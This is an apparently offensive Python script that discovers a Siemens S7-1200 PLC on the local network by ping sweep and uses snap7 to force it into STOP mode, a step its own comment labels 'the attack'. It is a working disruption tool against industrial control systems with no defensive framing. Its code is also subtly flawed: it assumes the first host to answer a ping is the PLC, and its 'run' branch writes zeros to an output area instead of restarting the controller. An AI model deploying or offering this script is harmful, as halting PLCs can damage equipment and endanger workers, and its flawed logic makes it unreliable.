import snap7
import struct
import socket
import subprocess

# Configuration
PLC_IP = None  # Initialize PLC_IP to None, it will be discovered
PLC_RACK = 0
PLC_SLOT = 1
LOCAL_TSAP = 0x0300 #TSAP for S7-1200
PLC_TSAP = 0x0100   # TSAP for S7-1200

def find_plc_ip():
    """
    Attempts to find the PLC IP address on the network.
    This is a simplified approach using ping sweeps.  A more robust
    discovery mechanism would use a dedicated industrial protocol scanner.

    Returns:
        str: The IP address of the PLC if found, otherwise None.
    """
    try:
        # Get the local network IP range.  This requires OS-specific logic.
        # A more robust implementation would need to handle different OSes.
        # For this example, we'll assume a Linux/macOS environment and use ipconfig/ifconfig.
        # and modify for windows (ipconfig).
        result = subprocess.run(['ipconfig'], capture_output=True, text=True) #OS agnostic
        output = result.stdout
        
        #Parse the output to find the IPv4 Address and Subnet Mask for the active Ethernet/Wireless Adapter
        ip_address = None
        subnet_mask = None
        
        for line in output.splitlines():
            if "IPv4 Address" in line:
                ip_address = line.split(":")[1].strip() #strip for leading whitespace
            if "Subnet Mask" in line:
                subnet_mask = line.split(":")[1].strip()
        
        if ip_address is None or subnet_mask is None:
            print("Could not determine network address and subnet mask from ipconfig output.")
            return None
        
        #Extract the network address and CIDR prefix from IP address and subnet mask
        network_address = ""
        cidr_prefix = 0
        
        ip_parts = ip_address.split(".")
        subnet_parts = subnet_mask.split(".")
        
        for i in range(4):
            network_address += str(int(ip_parts[i]) & int(subnet_parts[i])) + "." if i < 3 else str(int(ip_parts[i]) & int(subnet_parts[i]))
            cidr_prefix += bin(int(subnet_parts[i])).count('1')
            
        #Generate all possible IP Addresses in the network
        network_prefix = network_address[:network_address.rfind(".")] + "."
        
        possible_ips = [network_prefix + str(i) for i in range(1, 255)]
        
        #Ping each IP address and check for a response.
        for ip in possible_ips:
            try:
                # Use ping with a timeout to avoid long delays.  Adjust timeout as needed.
                result = subprocess.run(['ping', '-n', '1', '-w', '100', ip], capture_output=True, text=True) # -n 1 for 1 request, -w for timeout 100 ms
                if "Reply from" in result.stdout: #Check for reply from in stdout
                    print(f"Found PLC at IP: {ip}")
                    return ip
            except subprocess.CalledProcessError:
                pass  # Ping failed, continue to next IP.
        
        print("No PLC found on the network.")
        return None

    except Exception as e:
        print(f"Error during IP discovery: {e}")
        return None


def change_plc_mode(client, mode):
    """
    Changes the operating mode of the PLC.

    Args:
        client: The Snap7 client object.
        mode: The desired operating mode.  Acceptable values:
              'stop', 'run', 'program'.  Case-insensitive.
    """
    try:
        if mode.lower() == 'stop':
            # Send Stop command
            client.plc_stop()
            print("PLC stopped.")

        elif mode.lower() == 'run':
             #STOP the PLC first
             client.plc_stop()
             print("PLC stopped. Starting now...")
             # Send Run command
             # Construct the PLC start request
             data = bytearray([0x00, 0x00, 0x00, 0x00])
             client.write_area(snap7.consts.S7AreaPE, 0, 0, data)
             print("PLC started.")

        elif mode.lower() == 'program':
            # Not directly supported by Snap7.  This typically requires
            # putting the PLC in STOP mode first and then transitioning
            # to PROGRAM mode via a key switch or other mechanism
            # handled by the engineering workstation.
            print("Cannot directly set PLC to PROGRAM mode via Snap7. Set PLC to STOP. Use the TIA portal to change the program mode.")
            client.plc_stop()
            print("PLC stopped.")

        else:
            print(f"Invalid mode: {mode}.  Must be 'stop', 'run', or 'program'.")

    except Exception as e:
        print(f"Error changing PLC mode: {e}")


if __name__ == "__main__":
    # 1. Find PLC IP Address
    PLC_IP = find_plc_ip()

    if not PLC_IP:
        print("PLC IP address not found.  Exiting.")
        exit()

    # 2. Connect to the PLC
    client = snap7.client.Client()
    try:
        client.set_connection_params(PLC_IP, PLC_RACK, PLC_SLOT, LOCAL_TSAP, PLC_TSAP)
        client.connect(PLC_IP, PLC_RACK, PLC_SLOT)
        print(f"Connected to PLC at {PLC_IP}")

        # 3. Execute the attack: Change to STOP mode
        change_plc_mode(client, 'stop')

        # 4. Optional:  Change to RUN mode (after a delay or other condition)
        # time.sleep(5) # Wait for 5 seconds
        # change_plc_mode(client, 'run')

    except Exception as e:
        print(f"Error connecting to PLC: {e}")
    finally:
        # 5. Disconnect
        if client.get_connected():
            client.disconnect()
            print("Disconnected from PLC.")